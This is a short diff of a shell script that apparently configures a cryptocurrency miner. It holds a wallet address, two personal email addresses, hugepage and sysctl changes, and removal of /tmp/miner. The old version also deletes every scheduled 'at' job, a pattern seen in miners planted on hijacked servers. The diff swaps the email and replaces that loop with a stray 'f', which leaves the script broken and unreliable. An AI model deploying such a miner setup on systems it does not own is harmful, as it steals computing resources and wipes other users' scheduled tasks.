@@ -2,12 +2,12 @@
 
 WALLET=46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY
 ID="$(hostname)"
-MAIL=robbopp123@gmail.com
+MAIL=mattgradon@gmail.com
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
 rm -rf /tmp/miner/
-for i in atq | awk '{print $1}';do atrm $i;done
+f
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
